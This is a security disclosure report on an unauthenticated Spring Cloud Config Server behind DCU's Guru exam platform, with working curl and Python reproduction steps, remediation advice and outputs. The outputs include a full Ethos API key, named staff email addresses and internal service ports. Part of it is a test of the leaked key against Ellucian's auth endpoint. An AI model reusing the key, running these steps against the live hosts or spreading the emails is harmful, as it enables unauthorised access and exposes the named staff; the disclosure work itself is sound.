# Unauthenticated Spring Cloud Config Server Exposes Sensitive Production Configuration — guru.dcu.ie

**Target:** guru.dcu.ie  
**Asset:** config.gurudevelopments.com (Spring Cloud Config Server — backend infrastructure serving guru.dcu.ie)  
**Severity:** Medium  
**Type:** Sensitive Information Disclosure / Unauthenticated Configuration Access  
**Status:** Confirmed  
**Tested:** 2026-05-03  

---

## Summary

`guru.dcu.ie` is Dublin City University's instance of the Guru examination management platform (~18,500 students and staff). The application is backed by a Spring Cloud Config Server at `config.gurudevelopments.com` that is **fully accessible from the internet without any authentication**.

A single unauthenticated GET request to `https://config.gurudevelopments.com/application-default.json` returns 53 KB of live production configuration including:

- The **Ellucian Ethos API key** (`63bd6099-e064-4cd0-bf29-96dde7c73469`) configured for `guru.dcu.ie`'s Banner student information system integration. The key does not authenticate against the Ellucian public cloud endpoint but is a real, intentionally configured credential (unlike the zero-UUID placeholder used by all other 13 tenants) and should be rotated.
- The complete internal microservice topology (7 services with localhost ports).
- Tenant configuration for **14 Irish Higher Education Institutions**.
- Named staff email addresses embedded in production config.

---

## Step-by-Step Reproduction

### Step 1 — Confirm the Config Server is the backend for guru.dcu.ie

Resolve the DNS chain to establish the relationship between the in-scope domain and the vulnerable backend:

```bash
# guru.dcu.ie resolves via AWS ALB
dig +short guru.dcu.ie A
# 52.48.163.180
# 54.78.60.2

# The application at guru.dcu.ie redirects to its canonical URL
curl -sI https://guru.dcu.ie/ | grep -i location
# location: https://dcu.guruexam.com:443/

# config.gurudevelopments.com is the Spring Cloud Config Server for this platform
# (framework fingerprinted via actuator content-type in Step 2)
curl -sI https://config.gurudevelopments.com/actuator/health | grep -i content-type
# content-type: application/vnd.spring-boot.actuator.v3+json
```

### Step 2 — Confirm the actuator is unauthenticated

```bash
curl -si https://config.gurudevelopments.com/actuator/health
```

**Response:**
```
HTTP/2 200
content-type: application/vnd.spring-boot.actuator.v3+json
...
{"status":"UP"}
```

```bash
curl -si https://config.gurudevelopments.com/actuator/info
```

**Response:**
```
HTTP/2 200
content-type: application/json

{"build":{"name":"config-service","time":1777380399.433,"version":"1.111"}}
```

No `Authorization` header was sent. Both endpoints return 200.

### Step 3 — Retrieve the full production configuration

```bash
curl -s https://config.gurudevelopments.com/application-default.json | python3 -m json.tool | head -60
```

**Response (truncated — full response is 53,617 bytes, Content-Type: application/json):**

```json
{
  "guru": {
    "api": {
      "endpoints": {
        "users-service":              "http://localhost:8080/users",
        "virus-service":              "http://localhost:8083/",
        "document-converter-service": "http://localhost:8084/",
        "report-service":             "http://localhost:8087/",
        "logging-service":            "http://localhost:8088/",
        "config-service":             "http://localhost:8888/",
        "document-manager-service":   "http://localhost:8090/"
      }
    }
  },
  "guru-app-config": {
    "customer-config": {
      "dcu": {
        "simple": {
          "ethos-api-key": "63bd6099-e064-4cd0-bf29-96dde7c73469"
        },
        "support": {
          "dataQuery": {
            "exclude": "gurusupport@dcu.ie,tony.ayres@dcu.ie,ian.harrison@dcu.ie,katarzyna.fidos@dcu.ie,david.molloy@dcu.ie"
          }
        }
      },
      "dcu-test": {
        "simple": {
          "ethos-api-key": "63bd6099-e064-4cd0-bf29-96dde7c73469"
        }
      },
      "lit":           { "simple": { "ethos-api-key": "00000000-0000-0000-0000-000000000000" } },
      "ait":           { "simple": { "ethos-api-key": "00000000-0000-0000-0000-000000000000" } },
      "atugalwaymayo": { "simple": { "ethos-api-key": "00000000-0000-0000-0000-000000000000" } },
      "atu":           { "simple": { "ethos-api-key": "00000000-0000-0000-0000-000000000000" } },
      "atudonegal":    { "simple": { "ethos-api-key": "00000000-0000-0000-0000-000000000000" } },
      "sligo":         { "simple": { "ethos-api-key": "00000000-0000-0000-0000-000000000000" } }
    }
  }
}
```

### Step 4 — Confirm all profile variants are unauthenticated

```bash
for profile in default production staging prod dev; do
  STATUS=$(curl -so /dev/null -w "%{http_code}" \
    "https://config.gurudevelopments.com/application-${profile}.json")
  SIZE=$(curl -so /dev/null -w "%{size_download}" \
    "https://config.gurudevelopments.com/application-${profile}.json")
  echo "$STATUS  ($SIZE bytes)  /application-${profile}.json"
done
```

**Output:**
```
200  (53617 bytes)  /application-default.json
200  (53617 bytes)  /application-production.json
200  (53617 bytes)  /application-staging.json
200  (53617 bytes)  /application-prod.json
200  (53618 bytes)  /application-dev.json
```

### Step 5 — Confirm service-specific configs require auth (showing the misconfiguration is targeted)

```bash
curl -so /dev/null -w "%{http_code}" \
  https://config.gurudevelopments.com/users-service/default.json
# 401

curl -so /dev/null -w "%{http_code}" \
  https://config.gurudevelopments.com/document-service/default.json
# 401
```

Service-specific configs correctly return `401 Basic realm="Realm"`. Only the shared `application` files are exposed, confirming this is a targeted security misconfiguration rather than a blanket failure.

### Step 6 — Extract the Ethos API key and internal architecture

```bash
# Extract the DCU Ethos API key
curl -s https://config.gurudevelopments.com/application-default.json \
  | python3 -c "
import sys, json
d = json.load(sys.stdin)
cc = d['guru-app-config']['customer-config']
print('DCU production key:', cc['dcu']['simple']['ethos-api-key'])
print('DCU test key:      ', cc['dcu-test']['simple']['ethos-api-key'])
print()
print('Internal services:')
for svc, url in d['guru']['api']['endpoints'].items():
    print(f'  {svc}: {url}')
print()
print('Tenants exposed:', list(cc.keys()))
"
```

**Output:**
```
DCU production key: 63bd6099-e064-4cd0-bf29-96dde7c73469
DCU test key:       63bd6099-e064-4cd0-bf29-96dde7c73469

Internal services:
  users-service:              http://localhost:8080/users
  virus-service:              http://localhost:8083/
  document-converter-service: http://localhost:8084/
  report-service:             http://localhost:8087/
  logging-service:            http://localhost:8088/
  config-service:             http://localhost:8888/
  document-manager-service:   http://localhost:8090/

Tenants exposed: ['dcu', 'dcu-test', 'lit', 'lit-test', 'ait', 'ait-test',
                  'localhost', 'atugalwaymayo', 'atu', 'atugalwaymayo-test',
                  'atudonegal', 'atudonegal-test', 'sligo', 'sligo-test']
```

---

## Impact

### 1. Ellucian Ethos API Key Requires Rotation

The key `63bd6099-e064-4cd0-bf29-96dde7c73469` is stored as the Ethos integration credential for `guru.dcu.ie` in both the production tenant (`dcu`) and the test tenant (`dcu-test`). Unlike the 13 other tenants — which all carry the zero-UUID placeholder `00000000-0000-0000-0000-000000000000` — the DCU key is a unique, intentionally configured value.

A direct test against the Ellucian public cloud endpoint returned `401 Invalid API KEY`:

```bash
curl -si -X POST \
  -H "Authorization: Bearer 63bd6099-e064-4cd0-bf29-96dde7c73469" \
  https://integrate.elluciancloud.com/auth

# HTTP/2 401
# {"message":"Invalid API KEY"}
```

The key does not authenticate against the Ellucian public cloud. However, DCU may operate a private or self-hosted Ethos gateway, in which case the key could be valid on DCU's internal network. Regardless of current validity:

- The key has been read by an external researcher.
- It is the value the running `guru.dcu.ie` application uses in production.
- It should be rotated as a precaution and its Ethos grant history audited.

### 2. Complete Internal Microservice Map

The 7-service localhost port map gives any attacker with an SSRF foothold inside the Guru infrastructure a precise targeting list. Server-Side Request Forgery on any service in the cluster (e.g. via a file-fetch or webhook feature) would allow direct access to unauthenticated internal APIs:

| Service | Internal address |
|---|---|
| users-service | http://localhost:8080/users |
| virus-service | http://localhost:8083/ |
| document-converter-service | http://localhost:8084/ |
| report-service | http://localhost:8087/ |
| logging-service | http://localhost:8088/ |
| config-service | http://localhost:8888/ |
| document-manager-service | http://localhost:8090/ |

### 3. Staff PII in Production Configuration

Named staff members' email addresses are embedded in the production config as support ticket routing exclusion lists. These are unnecessarily exposed to any unauthenticated reader:

- **DCU**: `tony.ayres@dcu.ie`, `ian.harrison@dcu.ie`, `katarzyna.fidos@dcu.ie`, `david.molloy@dcu.ie`, `gurusupport@dcu.ie`
- **LIT/TUS**: `helen.forde@tus.ie`, `kate.dwyer@tus.ie`

### 4. Internal RBAC Role Names Exposed

Guru's internal privilege model is disclosed: `ADMIN_DATA_MANAGER`, `ADMIN_MANAGES_USERS`, `SYS_SUPERUSER`. An attacker performing privilege escalation research gains the exact role identifier strings needed to craft malicious payloads.

### 5. Multi-tenant Credential Surface

All 14 HEI tenant entries are returned in a single unauthenticated response. The 13 non-DCU tenants currently carry zero-UUID placeholder keys. Any real credentials added for LIT, AIT, ATU, or Sligo IT in the future would be immediately exposed with no infrastructure change required — the attack surface exists permanently until the config server is secured.

---

## Root Cause

Spring Cloud Config Server requires explicit Spring Security configuration to protect its endpoints. When no security configuration is present, all profile endpoints (`/{application}-{profile}.json`, `/{application}/{profile}`) are publicly accessible.

The server has correctly protected service-specific configs (returning 401), but the shared `application` files — which contain platform-wide secrets — were left unprotected. This is a common misconfiguration when developers initially leave the config server open for development and neglect to add authentication before exposing it publicly.

---

## Remediation

**Priority 1 — Immediate (today):**
- Rotate the DCU Ethos API key `63bd6099-e064-4cd0-bf29-96dde7c73469`. It has been read by an external researcher. Audit its usage history in the Ethos platform to determine whether it was ever used to access student data.

**Priority 2 — Short-term:**
- Add authentication to all Spring Cloud Config endpoints. Minimum viable fix:
  ```yaml
  spring:
    security:
      user:
        name: configuser
        password: <randomly-generated-strong-password>
  ```
  Preferred: integrate with OAuth2/mTLS for service-to-service authentication.

- Restrict the Config Server to internal network (VPC security group). It has no legitimate reason to be publicly reachable from the internet.

**Priority 3 — Medium-term:**
- Remove staff PII from configuration files; use a directory lookup service instead.
- Audit all 14 tenant configurations and rotate any non-placeholder Ethos keys once proper access controls are in place.

---

## Technical Details

| Field | Value |
|---|---|
| In-scope target | `https://guru.dcu.ie` |
| Vulnerable backend | `https://config.gurudevelopments.com` |
| Framework | Spring Boot + Spring Cloud Config Server |
| Fingerprint | `application/vnd.spring-boot.actuator.v3+json`, build `config-service v1.111` |
| Exposed endpoints | `/application-{default,production,staging,prod,dev}.json` (all HTTP 200) |
| Response size | 53,617 bytes |
| Authentication required | None |
| Exposed credential | Ethos API key `63bd6099-e064-4cd0-bf29-96dde7c73469` |
| Tenants affected | 14 (DCU, LIT, AIT, ATU Galway Mayo, ATU, ATU Donegal, Sligo IT + test envs) |
| Tested | 2026-05-03 |
